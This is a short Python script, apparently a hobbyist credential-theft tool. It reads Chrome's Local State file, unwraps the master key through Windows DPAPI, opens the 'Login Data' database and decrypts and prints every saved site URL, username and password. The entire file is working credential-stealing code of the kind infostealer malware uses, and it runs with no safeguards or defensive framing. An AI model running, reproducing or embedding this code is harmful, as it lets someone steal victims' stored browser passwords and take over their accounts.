import os
import sqlite3
import win32crypt
from Crypto.Cipher import AES
import json
import base64
# test with marsellino stay safe :D
def get_encryption_key():
    local_state_path = os.path.join(os.environ["USERPROFILE"],
                                    "AppData", "Local", "Google", "Chrome",
                                    "User Data", "Local State")
    with open(local_state_path, "r", encoding="utf-8") as file:
        local_state = json.loads(file.read())
    encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
    return win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]

def decrypt_password(encrypted_password, key):
    try:
        iv = encrypted_password[3:15]
        payload = encrypted_password[15:]
        cipher = AES.new(key, AES.MODE_GCM, iv)
        decrypted_pass = cipher.decrypt(payload)[:-16].decode()
        return decrypted_pass
    except:
        return None

def get_chrome_passwords():
    key = get_encryption_key()
    db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                           "Google", "Chrome", "User Data", "Default", "Login Data")
    
    with sqlite3.connect(db_path) as db:
        cursor = db.cursor()
        cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
        for origin_url, username, encrypted_password in cursor.fetchall():
            if encrypted_password:
                decrypted_password = decrypt_password(encrypted_password, key)
                if username and decrypted_password:
                    print(f"Origin URL: {origin_url}")
                    print(f"Username: {username}")
                    print(f"Password: {decrypted_password}")
                    print("=" * 50)
        cursor.close()

if __name__ == "__main__":
    get_chrome_passwords()
